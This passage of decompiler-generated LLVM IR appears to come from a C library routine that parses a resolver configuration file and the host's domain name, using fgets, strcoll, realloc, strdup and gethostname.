  store i32 27360, i32* @r7, align 4
  %v0_192d4 = load i32, i32* @r5, align 4
  %v2_192d4 = add i32 %v0_192d4, 27360
  %v3_192d4 = inttoptr i32 %v2_192d4 to i32*
  %v4_192d4 = load i32, i32* %v3_192d4, align 4
  store i32 27356, i32* @sl, align 4
  %v1_192dc = add i32 %v4_192d4, 1
  store i32 %v1_192dc, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_192e4 = mul i32 %v1_192dc, 28
  store i32 %v2_192e4, i32* %r1.global-to-local, align 4
  %v2_192e8 = add i32 %v0_192d4, 27356
  %v3_192e8 = inttoptr i32 %v2_192e8 to i32*
  %v4_192e8 = load i32, i32* %v3_192e8, align 4
  store i32 %v4_192e8, i32* %r0.global-to-local, align 4
  %v2_192ec = inttoptr i32 %v4_192e8 to i32*
  %v3_192ec = call i32 @realloc(i32* %v2_192ec, i32 %v2_192e4)
  store i32 %v3_192ec, i32* %r0.global-to-local, align 4
  store i32 %v3_192ec, i32* @r6, align 4
  %v2_192f0 = icmp eq i32 %v3_192ec, 0
  br i1 %v2_192f0, label %dec_label_pc_19498.backedge, label %dec_label_pc_192f8

dec_label_pc_192f8:                               ; preds = %dec_label_pc_192c0
  %v0_192f8 = load i32, i32* @r5, align 4
  %v1_192f8 = load i32, i32* @r7, align 4
  %v2_192f8 = add i32 %v1_192f8, %v0_192f8
  %v3_192f8 = inttoptr i32 %v2_192f8 to i32*
  %v4_192f8 = load i32, i32* %v3_192f8, align 4
  store i32 %v4_192f8, i32* %r4.global-to-local, align 4
  %v1_192fc = load i32, i32* @r8, align 4
  %v3_192fc = mul i32 %v1_192fc, %v4_192f8
  %v4_192fc = add i32 %v3_192fc, %v3_192ec
  store i32 %v4_192fc, i32* %lr.global-to-local, align 4
  %v2_19304 = load i16, i16* %stack_var_-68, align 2
  %v3_19304 = sext i16 %v2_19304 to i32
  store i32 %v3_19304, i32* %r0.global-to-local, align 4
  %v6_19304 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_19304, i32* %r1.global-to-local, align 4
  %v9_19304 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_19304, i32* %r2.global-to-local, align 4
  store i32 %v14_19304, i32* @ip, align 4
  %v2_19308 = load i32, i32* @sl, align 4
  %v3_19308 = add i32 %v2_19308, %v0_192f8
  %v4_19308 = inttoptr i32 %v3_19308 to i32*
  store i32 %v3_192ec, i32* %v4_19308, align 4
  %v0_1930c = load i32, i32* %lr.global-to-local, align 4
  %v1_1930c = inttoptr i32 %v0_1930c to i32*
  %v2_1930c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1930c, i32* %v1_1930c, align 4
  %v3_1930c = add i32 %v0_1930c, 4
  %v4_1930c = inttoptr i32 %v3_1930c to i32*
  %v5_1930c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1930c, i32* %v4_1930c, align 4
  %v6_1930c = add i32 %v0_1930c, 8
  %v7_1930c = inttoptr i32 %v6_1930c to i32*
  %v8_1930c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1930c, i32* %v7_1930c, align 4
  %v9_1930c = add i32 %v0_1930c, 12
  %v10_1930c = inttoptr i32 %v9_1930c to i32*
  %v11_1930c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1930c, i32* %v10_1930c, align 4
  %v12_1930c = add i32 %v0_1930c, 16
  store i32 %v12_1930c, i32* @lr, align 4
  %v2_19310 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_19310, i32* %r0.global-to-local, align 4
  %v0_19314 = load i32, i32* %r4.global-to-local, align 4
  %v1_19314 = add i32 %v0_19314, 1
  store i32 %v1_19314, i32* %r4.global-to-local, align 4
  %v1_19318 = inttoptr i32 %v12_1930c to i32*
  store i32 %v2_19310, i32* %v1_19318, align 4
  %v3_19318 = add i32 %v0_1930c, 20
  %v4_19318 = inttoptr i32 %v3_19318 to i32*
  %v5_19318 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_19318, i32* %v4_19318, align 4
  %v6_19318 = add i32 %v0_1930c, 24
  %v7_19318 = inttoptr i32 %v6_19318 to i32*
  %v8_19318 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_19318, i32* %v7_19318, align 4
  %v0_1931c = load i32, i32* %r4.global-to-local, align 4
  %v1_1931c = load i32, i32* @r5, align 4
  %v2_1931c = load i32, i32* @r7, align 4
  %v3_1931c = add i32 %v2_1931c, %v1_1931c
  %v4_1931c = inttoptr i32 %v3_1931c to i32*
  store i32 %v0_1931c, i32* %v4_1931c, align 4
  br label %dec_label_pc_19498.backedge

dec_label_pc_19498.backedge:                      ; preds = %dec_label_pc_193c0, %dec_label_pc_193b0, %dec_label_pc_1937c, %dec_label_pc_192f8, %dec_label_pc_19450, %dec_label_pc_192a4, %dec_label_pc_192c0, %dec_label_pc_193f8, %dec_label_pc_19400, %dec_label_pc_193e4, %dec_label_pc_19434
  %v0_194a4.pre = load i32, i32* @fp, align 4
  store i32 %v2_19498, i32* @r4, align 4
  store i32 %v2_19498, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_194a4.pre, i32* %r2.global-to-local, align 4
  %v3_194a8 = call i32 @fgets(i32 %v2_19498, i32 128, i32 %v0_194a4.pre)
  store i32 %v3_194a8, i32* %r0.global-to-local, align 4
  %v2_194ac = icmp eq i32 %v3_194a8, 0
  br i1 %v2_194ac, label %dec_label_pc_194b4, label %dec_label_pc_1923c

dec_label_pc_19324:                               ; preds = %dec_label_pc_1923c
  %v0_19324 = load i32, i32* @r4, align 4
  store i32 %v0_19324, i32* %r0.global-to-local, align 4
  store i32 %v2_19474, i32* @r1, align 4
  %v2_1932c = inttoptr i32 %v0_19324 to i8*
  %v3_1932c = call i32 @__GI_strcoll(i8* %v2_1932c, i32 %v2_19474)
  store i32 %v3_1932c, i32* %r0.global-to-local, align 4
  %v2_19330 = icmp eq i32 %v3_1932c, 0
  br i1 %v2_19330, label %dec_label_pc_19364, label %dec_label_pc_19338

dec_label_pc_19338:                               ; preds = %dec_label_pc_19324
  %v0_19338 = load i32, i32* @r4, align 4
  store i32 %v0_19338, i32* %r0.global-to-local, align 4
  store i32 %v2_19480, i32* @r1, align 4
  %v2_19340 = inttoptr i32 %v0_19338 to i8*
  %v3_19340 = call i32 @__GI_strcoll(i8* %v2_19340, i32 %v2_19480)
  store i32 %v3_19340, i32* %r0.global-to-local, align 4
  %v2_19344 = icmp eq i32 %v3_19340, 0
  br i1 %v2_19344, label %dec_label_pc_19364, label %dec_label_pc_193e4

dec_label_pc_19350:                               ; preds = %dec_label_pc_19364, %dec_label_pc_19350.dec_label_pc_19350_crit_edge
  %v2_19354 = phi i32 [ %v1_19368, %dec_label_pc_19350.dec_label_pc_19350_crit_edge ], [ %v1_1936810, %dec_label_pc_19364 ]
  %v0_19354 = phi i32 [ %v1_19370, %dec_label_pc_19350.dec_label_pc_19350_crit_edge ], [ %v1_1937017, %dec_label_pc_19364 ]
  %v1_19350 = phi i32 [ %v1_19350.pre, %dec_label_pc_19350.dec_label_pc_19350_crit_edge ], [ 27352, %dec_label_pc_19364 ]
  %v1_19354 = phi i32 [ %v0_19368, %dec_label_pc_19350.dec_label_pc_19350_crit_edge ], [ %v0_193689, %dec_label_pc_19364 ]
  %v2_19350 = add i32 %v1_19354, %v1_19350
  %v3_19350 = inttoptr i32 %v2_19350 to i32*
  %v4_19350 = load i32, i32* %v3_19350, align 4
  store i32 %v4_19350, i32* %r3.global-to-local, align 4
  %v3_19354 = add i32 %v1_19354, %v2_19354
  %v4_19354 = inttoptr i32 %v3_19354 to i32*
  store i32 %v0_19354, i32* %v4_19354, align 4
  %v0_19358 = load i32, i32* %r3.global-to-local, align 4
  %v1_19358 = load i32, i32* %r2.global-to-local, align 4
  %v4_19358 = mul i32 %v1_19358, 4
  %v5_19358 = add i32 %v4_19358, %v0_19358
  %v6_19358 = inttoptr i32 %v5_19358 to i32*
  %v7_19358 = load i32, i32* %v6_19358, align 4
  store i32 %v7_19358, i32* @r0, align 4
  %v0_1935c = call i32 @free()
  store i32 %v0_1935c, i32* %r0.global-to-local, align 4
  %v0_19368 = load i32, i32* @r5, align 4
  %v1_19368 = load i32, i32* @sb, align 4
  %v2_19368 = add i32 %v1_19368, %v0_19368
  %v3_19368 = inttoptr i32 %v2_19368 to i32*
  %v4_19368 = load i32, i32* %v3_19368, align 4
  store i32 %v4_19368, i32* %r3.global-to-local, align 4
  %v2_1936c = icmp eq i32 %v4_19368, 0
  %v1_19370 = add i32 %v4_19368, -1
  store i32 %v1_19370, i32* %r2.global-to-local, align 4
  br i1 %v2_1936c, label %dec_label_pc_19378, label %dec_label_pc_19350.dec_label_pc_19350_crit_edge

dec_label_pc_19350.dec_label_pc_19350_crit_edge:  ; preds = %dec_label_pc_19350
  %v1_19350.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19350

dec_label_pc_19364:                               ; preds = %dec_label_pc_19338, %dec_label_pc_19324
  store i32 27352, i32* @r4, align 4
  %v0_193689 = load i32, i32* @r5, align 4
  %v1_1936810 = load i32, i32* @sb, align 4
  %v2_1936811 = add i32 %v1_1936810, %v0_193689
  %v3_1936812 = inttoptr i32 %v2_1936811 to i32*
  %v4_1936813 = load i32, i32* %v3_1936812, align 4
  store i32 %v4_1936813, i32* %r3.global-to-local, align 4
  %v2_1936c15 = icmp eq i32 %v4_1936813, 0
  %v1_1937017 = add i32 %v4_1936813, -1
  store i32 %v1_1937017, i32* %r2.global-to-local, align 4
  br i1 %v2_1936c15, label %dec_label_pc_19378, label %dec_label_pc_19350

dec_label_pc_19378:                               ; preds = %dec_label_pc_19350, %dec_label_pc_19364
  store i32 27352, i32* @r6, align 4
  br label %dec_label_pc_1937c

dec_label_pc_1937c:                               ; preds = %dec_label_pc_193c0, %dec_label_pc_19378
  %v0_1937c = load i32, i32* @r7, align 4
  store i32 %v0_1937c, i32* %r0.global-to-local, align 4
  %v0_19380 = call i32 @skip_nospace()
  store i32 %v0_19380, i32* %r0.global-to-local, align 4
  %v1_19384 = inttoptr i32 %v0_19380 to i8*
  %v2_19384 = call i32 @skip_and_NUL_space(i8* %v1_19384)
  store i32 %v2_19384, i32* %r0.global-to-local, align 4
  %v0_19388 = load i32, i32* @r5, align 4
  %v1_19388 = load i32, i32* @sb, align 4
  %v2_19388 = add i32 %v1_19388, %v0_19388
  %v3_19388 = inttoptr i32 %v2_19388 to i32*
  %v4_19388 = load i32, i32* %v3_19388, align 4
  store i32 %v2_19384, i32* @r4, align 4
  %tmp69 = mul i32 %v4_19388, 4
  %v3_19394 = add i32 %tmp69, 4
  store i32 %v3_19394, i32* %r1.global-to-local, align 4
  %v1_19398 = load i32, i32* @r6, align 4
  %v2_19398 = add i32 %v1_19398, %v0_19388
  %v3_19398 = inttoptr i32 %v2_19398 to i32*
  %v4_19398 = load i32, i32* %v3_19398, align 4
  store i32 %v4_19398, i32* %r0.global-to-local, align 4
  %v2_1939c = inttoptr i32 %v4_19398 to i32*
  %v3_1939c = call i32 @realloc(i32* %v2_1939c, i32 %v3_19394)
  store i32 %v3_1939c, i32* %r3.global-to-local, align 4
  %v2_193a0 = icmp eq i32 %v3_1939c, 0
  %v0_193a4 = load i32, i32* @r7, align 4
  store i32 %v0_193a4, i32* %r0.global-to-local, align 4
  %v0_193a8 = load i32, i32* @r4, align 4
  store i32 %v0_193a8, i32* @r7, align 4
  br i1 %v2_193a0, label %dec_label_pc_19498.backedge, label %dec_label_pc_193b0

dec_label_pc_193b0:                               ; preds = %dec_label_pc_1937c
  %v1_193b0 = load i32, i32* @r5, align 4
  %v2_193b0 = load i32, i32* @r6, align 4
  %v3_193b0 = add i32 %v2_193b0, %v1_193b0
  %v4_193b0 = inttoptr i32 %v3_193b0 to i32*
  store i32 %v3_1939c, i32* %v4_193b0, align 4
  %v1_193b4 = inttoptr i32 %v0_193a4 to i8*
  %v2_193b4 = call i32 @__GI_strdup(i8* %v1_193b4)
  store i32 %v2_193b4, i32* %r0.global-to-local, align 4
  %v2_193b8 = icmp eq i32 %v2_193b4, 0
  br i1 %v2_193b8, label %dec_label_pc_19498.backedge, label %dec_label_pc_193c0

dec_label_pc_193c0:                               ; preds = %dec_label_pc_193b0
  %v0_193c0 = load i32, i32* @r5, align 4
  %v1_193c0 = load i32, i32* @sb, align 4
  %v2_193c0 = add i32 %v1_193c0, %v0_193c0
  %v3_193c0 = inttoptr i32 %v2_193c0 to i32*
  %v4_193c0 = load i32, i32* %v3_193c0, align 4
  store i32 %v4_193c0, i32* %r3.global-to-local, align 4
  %v1_193c4 = load i32, i32* @r6, align 4
  %v2_193c4 = add i32 %v1_193c4, %v0_193c0
  %v3_193c4 = inttoptr i32 %v2_193c4 to i32*
  %v4_193c4 = load i32, i32* %v3_193c4, align 4
  store i32 %v4_193c4, i32* %r2.global-to-local, align 4
  %v1_193c8 = add i32 %v4_193c0, 1
  store i32 %v1_193c8, i32* %r1.global-to-local, align 4
  %v5_193cc = mul i32 %v4_193c0, 4
  %v6_193cc = add i32 %v4_193c4, %v5_193cc
  %v7_193cc = inttoptr i32 %v6_193cc to i32*
  store i32 %v2_193b4, i32* %v7_193cc, align 4
  %v0_193d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_193d0 = load i32, i32* @r5, align 4
  %v2_193d0 = load i32, i32* @sb, align 4
  %v3_193d0 = add i32 %v2_193d0, %v1_193d0
  %v4_193d0 = inttoptr i32 %v3_193d0 to i32*
  store i32 %v0_193d0, i32* %v4_193d0, align 4
  %v0_193d4 = load i32, i32* @r4, align 4
  %v1_193d4 = inttoptr i32 %v0_193d4 to i8*
  %v2_193d4 = load i8, i8* %v1_193d4, align 1
  %v3_193d4 = zext i8 %v2_193d4 to i32
  store i32 %v3_193d4, i32* %r3.global-to-local, align 4
  %v2_193d8 = icmp eq i8 %v2_193d4, 0
  br i1 %v2_193d8, label %dec_label_pc_19498.backedge, label %dec_label_pc_1937c

dec_label_pc_193e4:                               ; preds = %dec_label_pc_19338
  %v0_193e4 = load i32, i32* @r4, align 4
  store i32 %v0_193e4, i32* %r0.global-to-local, align 4
  %v2_193e8 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_193e8, i32* @r1, align 4
  %v2_193ec = inttoptr i32 %v0_193e4 to i8*
  %v3_193ec = call i32 @__GI_strcoll(i8* %v2_193ec, i32 %v2_193e8)
  store i32 %v3_193ec, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_193ec, 16777216
  %v1_193f0 = sdiv i32 %sext2, 16777216
  store i32 %v1_193f0, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_193f8, label %dec_label_pc_19498.backedge

dec_label_pc_193f8:                               ; preds = %dec_label_pc_193e4
  %v0_193f8 = load i32, i32* @r7, align 4
  %v2_193f8 = icmp eq i32 %v0_193f8, 0
  br i1 %v2_193f8, label %dec_label_pc_19498.backedge, label %dec_label_pc_19400

dec_label_pc_19400:                               ; preds = %dec_label_pc_193f8
  store i32 %v0_193f8, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_19408 = call i32 @__GI_strchr(i32 %v0_193f8, i32 58)
  store i32 %v2_19408, i32* %r0.global-to-local, align 4
  store i32 %v2_19408, i32* @r6, align 4
  %v3_1940c = icmp eq i32 %v2_19408, 0
  br i1 %v3_1940c, label %dec_label_pc_19498.backedge, label %dec_label_pc_19414

dec_label_pc_19414:                               ; preds = %dec_label_pc_19400
  store i32 -34064, i32* %r1.global-to-local, align 4
  %v0_19418 = load i32, i32* @r4, align 4
  %v1_19418 = trunc i32 %v0_19418 to i8
  %v3_19418 = inttoptr i32 %v2_19408 to i8*
  store i8 %v1_19418, i8* %v3_19418, align 1
  %v0_1941c = load i32, i32* @r5, align 4
  %v1_1941c = load i32, i32* %r1.global-to-local, align 4
  %v2_1941c = add i32 %v1_1941c, %v0_1941c
  store i32 %v2_1941c, i32* @r1, align 4
  %v0_19420 = load i32, i32* @r7, align 4
  store i32 %v0_19420, i32* %r0.global-to-local, align 4
  %v2_19424 = inttoptr i32 %v0_19420 to i8*
  %v3_19424 = call i32 @__GI_strcoll(i8* %v2_19424, i32 %v2_1941c)
  store i32 %v3_19424, i32* %r0.global-to-local, align 4
  %v2_19428 = icmp eq i32 %v3_19424, 0
  br i1 %v2_19428, label %dec_label_pc_19450, label %dec_label_pc_19434

dec_label_pc_19434:                               ; preds = %dec_label_pc_19414
  %v0_19438 = load i32, i32* @r7, align 4
  store i32 %v0_19438, i32* %r0.global-to-local, align 4
  %v0_1943c = load i32, i32* @r5, align 4
  %v2_1943c = add i32 %v0_1943c, -34056
  store i32 %v2_1943c, i32* @r1, align 4
  %v2_19440 = inttoptr i32 %v0_19438 to i8*
  %v3_19440 = call i32 @__GI_strcoll(i8* %v2_19440, i32 %v2_1943c)
  store i32 %v3_19440, i32* %r0.global-to-local, align 4
  %v2_19444 = icmp eq i32 %v3_19440, 0
  br i1 %v2_19444, label %dec_label_pc_19450, label %dec_label_pc_19498.backedge

dec_label_pc_19450:                               ; preds = %dec_label_pc_19434, %dec_label_pc_19414
  %storemerge = phi i32 [ 1122, %dec_label_pc_19414 ], [ 1123, %dec_label_pc_19434 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_19450 = load i32, i32* @r6, align 4
  %v1_19450 = add i32 %v0_19450, 1
  store i32 %v1_19450, i32* @r0, align 4
  %v0_19454 = load i32, i32* @r5, align 4
  %v2_19454 = add i32 %v0_19454, %storemerge
  store i32 %v2_19454, i32* @r4, align 4
  %v1_19458 = call i32 @atol(i32 %v1_19450)
  %v2_19458 = trunc i32 %v1_19458 to i8
  store i32 %v1_19458, i32* %r0.global-to-local, align 4
  %v3_1945c = load i32, i32* @r4, align 4
  %v4_1945c = inttoptr i32 %v3_1945c to i8*
  store i8 %v2_19458, i8* %v4_1945c, align 1
  br label %dec_label_pc_19498.backedge

dec_label_pc_19464:                               ; preds = %dec_label_pc_19204
  %v0_19468 = load i32, i32* @r5, align 4
  %v2_19468 = add i32 %v0_19468, -34100
  %v2_19474 = add i32 %v0_19468, -34088
  %v2_19480 = add i32 %v0_19468, -34080
  %v2_1948c = add i32 %v0_19468, -34072
  store i32 %v2_1948c, i32* %r3.global-to-local, align 4
  store i32 27364, i32* @sb, align 4
  store i32 %v2_1948c, i32* %stack_var_-560, align 4
  %v2_19498 = ptrtoint i32* %stack_var_-288 to i32
  %v1_19240 = bitcast i32* %stack_var_-288 to i8*
  %v2_19270 = ptrtoint i16* %stack_var_-68 to i32
  %v2_19284 = bitcast i16* %stack_var_-68 to i8*
  %v2_19290 = ptrtoint i32* %stack_var_-60 to i32
  %v2_192a8 = ptrtoint i32* %stack_var_-64 to i32
  %v2_192c0 = ptrtoint i32* %stack_var_-304 to i32
  %v14_19304 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_19498, i32* @r4, align 4
  store i32 %v2_19498, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v2_1922c, i32* %r2.global-to-local, align 4
  %v3_194a866 = call i32 @fgets(i32 %v2_19498, i32 128, i32 %v2_1922c)
  store i32 %v3_194a866, i32* %r0.global-to-local, align 4
  %v2_194ac68 = icmp eq i32 %v3_194a866, 0
  br i1 %v2_194ac68, label %dec_label_pc_194b4, label %dec_label_pc_1923c

dec_label_pc_194b4:                               ; preds = %dec_label_pc_19498.backedge, %dec_label_pc_19464
  %v0_194b4 = load i32, i32* @fp, align 4
  store i32 %v0_194b4, i32* %r0.global-to-local, align 4
  %v1_194b8 = inttoptr i32 %v0_194b4 to i16*
  %v2_194b8 = call i32 @__GI_fclose(i16* %v1_194b8)
  store i32 %v2_194b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_194bc

dec_label_pc_194bc:                               ; preds = %dec_label_pc_19204, %dec_label_pc_194b4
  store i32 27360, i32* %r3.global-to-local, align 4
  %v0_194c0 = load i32, i32* @r5, align 4
  %v2_194c0 = add i32 %v0_194c0, 27360
  %v3_194c0 = inttoptr i32 %v2_194c0 to i32*
  %v4_194c0 = load i32, i32* %v3_194c0, align 4
  store i32 %v4_194c0, i32* %r3.global-to-local, align 4
  %v2_194c4 = icmp eq i32 %v4_194c0, 0
  br i1 %v2_194c4, label %dec_label_pc_194cc, label %dec_label_pc_19508

dec_label_pc_194cc:                               ; preds = %dec_label_pc_194bc
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_194d0 = call i32 @malloc(i32 28)
  store i32 %v1_194d0, i32* %r0.global-to-local, align 4
  store i32 -34044, i32* %r3.global-to-local, align 4
  store i32 27356, i32* %r2.global-to-local, align 4
  %v2_194dc = icmp eq i32 %v1_194d0, 0
  %v1_194e0 = load i32, i32* @r5, align 4
  br i1 %v2_194dc, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_194cc
  %v3_194e0 = add i32 %v1_194e0, -34044
  store i32 %v3_194e0, i32* %r3.global-to-local, align 4
  %v3_194e428 = add i32 %v1_194e0, 27356
  %v4_194e429 = inttoptr i32 %v3_194e428 to i32*
  store i32 0, i32* %v4_194e429, align 4
  %v1_194e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_194e8 = load i32, i32* @r5, align 4
  %v3_194e8 = load i32, i32* %r2.global-to-local, align 4
  %v4_194e8 = add i32 %v3_194e8, %v2_194e8
  %v5_194e8 = inttoptr i32 %v4_194e8 to i32*
  store i32 %v1_194e8, i32* %v5_194e8, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_194cc
  %v3_194e4 = add i32 %v1_194e0, 27356
  %v4_194e4 = inttoptr i32 %v3_194e4 to i32*
  store i32 %v1_194d0, i32* %v4_194e4, align 4
  %v1_194ec = load i32, i32* @r5, align 4
  %v2_194ec = load i32, i32* %r3.global-to-local, align 4
  %v3_194ec = add i32 %v2_194ec, %v1_194ec
  store i32 %v3_194ec, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 103672, i32* @lr, align 4
  %v1_194f4 = xor i1 %v2_194dc, true
  call void @__pseudo_cond_branch(i1 %v1_194f4, i32 ptrtoint (i32* @global_var_11ad0.553 to i32))
  store i32 27360, i32* %r2.global-to-local, align 4
  %v0_194fc = load i32, i32* @r5, align 4
  %v2_194fc = add i32 %v0_194fc, 27360
  %v3_194fc = inttoptr i32 %v2_194fc to i32*
  %v4_194fc = load i32, i32* %v3_194fc, align 4
  %v1_19500 = add i32 %v4_194fc, 1
  store i32 %v1_19500, i32* %r3.global-to-local, align 4
  store i32 %v1_19500, i32* %v3_194fc, align 4
  %v0_1950c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19508

dec_label_pc_19508:                               ; preds = %dec_label_pc_194bc, %.thread4
  %v0_1950c = phi i32 [ %v0_194c0, %dec_label_pc_194bc ], [ %v0_1950c.pre, %.thread4 ]
  store i32 27364, i32* @r7, align 4
  %v2_1950c = add i32 %v0_1950c, 27364
  %v3_1950c = inttoptr i32 %v2_1950c to i32*
  %v4_1950c = load i32, i32* %v3_1950c, align 4
  store i32 %v4_1950c, i32* @r4, align 4
  %v2_19510 = icmp eq i32 %v4_1950c, 0
  br i1 %v2_19510, label %dec_label_pc_19518, label %dec_label_pc_19598

dec_label_pc_19518:                               ; preds = %dec_label_pc_19508
  %v2_19518 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_19518, i32* @r6, align 4
  store i32 %v2_19518, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_19524 = call i32 @__GI_gethostname(i32 %v2_19518, i32 255)
  store i32 %v2_19524, i32* %r0.global-to-local, align 4
  %v2_19528 = icmp eq i32 %v2_19524, 0
  br i1 %v2_19528, label %dec_label_pc_19534, label %dec_label_pc_19598

dec_label_pc_19534:                               ; preds = %dec_label_pc_19518
  store i32 %v2_19518, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_1953c = call i32 @__GI_strchr(i32 %v2_19518, i32 46)
  store i32 %v2_1953c, i32* %r0.global-to-local, align 4
  %v2_19540 = icmp eq i32 %v2_1953c, 0
  br i1 %v2_19540, label %dec_label_pc_19598, label %dec_label_pc_19548

dec_label_pc_19548:                               ; preds = %dec_label_pc_19534
  %v1_19548 = add i32 %v2_1953c, 1
  %v2_19548 = inttoptr i32 %v1_19548 to i8*
  %v3_19548 = load i8, i8* %v2_19548, align 1
  %v4_19548 = zext i8 %v3_19548 to i32
  store i32 %v4_19548, i32* %r3.global-to-local, align 4
  %v2_1954c = icmp eq i8 %v3_19548, 0
  store i32 %v1_19548, i32* %r0.global-to-local, align 4
  br i1 %v2_1954c, label %dec_label_pc_19598, label %dec_label_pc_19558

dec_label_pc_19558:                               ; preds = %dec_label_pc_19548
  %v2_19558 = call i32 @__GI_strdup(i8* %v2_19548)
  store i32 %v2_19558, i32* %r0.global-to-local, align 4
  store i32 %v2_19558, i32* @r4, align 4
  %v2_1955c = icmp eq i32 %v2_19558, 0
  br i1 %v2_1955c, label %dec_label_pc_19598, label %dec_label_pc_19564

dec_label_pc_19564:                               ; preds = %dec_label_pc_19558
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_19568 = call i32 @malloc(i32 4)
  store i32 %v1_19568, i32* %r0.global-to-local, align 4
  store i32 27352, i32* %r3.global-to-local, align 4
  %v2_19570 = icmp eq i32 %v1_19568, 0
  %v1_19574 = load i32, i32* @r5, align 4
  %v3_19574 = add i32 %v1_19574, 27352
  %v4_19574 = inttoptr i32 %v3_19574 to i32*
  store i32 %v1_19568, i32* %v4_19574, align 4
  br i1 %v2_19570, label %dec_label_pc_1957c, label %dec_label_pc_19588

dec_label_pc_1957c:                               ; preds = %dec_label_pc_19564
  %v0_1957c = load i32, i32* @r4, align 4
  store i32 %v0_1957c, i32* @r0, align 4
  %v0_19580 = call i32 @free()
  store i32 %v0_19580, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19598

dec_label_pc_19588:                               ; preds = %dec_label_pc_19564
  %v0_19588 = load i32, i32* @r5, align 4
  %v1_19588 = load i32, i32* @r7, align 4
  %v2_19588 = add i32 %v1_19588, %v0_19588
  %v3_19588 = inttoptr i32 %v2_19588 to i32*
  %v4_19588 = load i32, i32* %v3_19588, align 4
  %v1_1958c = add i32 %v4_19588, 1
  store i32 %v1_1958c, i32* %r3.global-to-local, align 4
  %v0_19590 = load i32, i32* @r4, align 4
  %v2_19590 = inttoptr i32 %v1_19568 to i32*
  store i32 %v0_19590, i32* %v2_19590, align 4
  %v0_19594 = load i32, i32* %r3.global-to-local, align 4
  %v1_19594 = load i32, i32* @r5, align 4
  %v2_19594 = load i32, i32* @r7, align 4
  %v3_19594 = add i32 %v2_19594, %v1_19594
  %v4_19594 = inttoptr i32 %v3_19594 to i32*
  store i32 %v0_19594, i32* %v4_19594, align 4
  br label %dec_label_pc_19598

dec_label_pc_19598:                               ; preds = %dec_label_pc_19518, %dec_label_pc_19508, %dec_label_pc_191f4, %dec_label_pc_19558, %dec_label_pc_19548, %dec_label_pc_19534, %dec_label_pc_1957c, %dec_label_pc_19588
  store i32 27348, i32* %r3.global-to-local, align 4
  %v0_1959c = load i32, i32* @r5, align 4
  %v2_1959c = add i32 %v0_1959c, 27348
  %v3_1959c = inttoptr i32 %v2_1959c to i32*
  %v4_1959c = load i32, i32* %v3_1959c, align 4
  store i32 %v4_1959c, i32* %r0.global-to-local, align 4
  %v2_195a0 = icmp eq i32 %v4_1959c, 0
  br i1 %v2_195a0, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_19598
  store i32 103852, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_19598, %bb64
  %v2_195a8 = xor i1 %v2_195a0, true
  call void @__pseudo_cond_branch(i1 %v2_195a8, i32 %v4_1959c)
  %v2_195b0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_195b0, i32* %r4.global-to-local, align 4
  store i32 %v15_191a4, i32* @r8, align 4
  store i32 %v18_191a4, i32* @sb, align 4
  store i32 %v21_191a4, i32* @sl, align 4
  store i32 %v24_191a4, i32* @fp, align 4
  store i32 %v27_191a4, i32* %lr.global-to-local, align 4
  ret i32 %v4_1959c

; uselistorder directives
  uselistorder i32 %v1_19568, { 1, 0, 2, 3 }
  uselistorder i32 %v2_19518, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_192a8, { 1, 0 }
  uselistorder i32 %v2_19290, { 1, 0 }
  uselistorder i32 %v2_19270, { 1, 0 }
  uselistorder i32 %v2_19498, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_19468, { 1, 0, 2, 3 }
  uselistorder i32 %v1_19458, { 1, 0 }
  uselistorder i32 %v0_193f8, { 1, 0, 2 }
  uselistorder i32 %v1_1937017, { 1, 0 }
  uselistorder i32 %v1_1936810, { 1, 0 }
  uselistorder i32 %v0_193689, { 1, 0 }
  uselistorder i32 %v1_19370, { 1, 0 }
  uselistorder i32 %v3_192ec, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 23, 0, 14, 15, 16, 1, 19, 17, 18, 20, 21, 22, 24, 25, 26, 27, 28 }
